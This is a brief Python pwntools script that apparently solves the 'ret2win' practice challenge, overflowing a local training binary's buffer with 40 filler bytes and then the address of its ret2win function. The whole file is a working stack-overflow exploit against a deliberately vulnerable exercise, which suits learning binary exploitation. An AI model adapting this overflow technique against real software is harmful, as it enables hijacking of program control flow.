from pwn import *

elf = ELF('ret2win')
proc = process(elf.path)
ret2win_addr = p64(elf.symbols.ret2win)
payload = flat(b'\x41' * 40, ret2win_addr)
proc.send(payload)
proc.interactive()
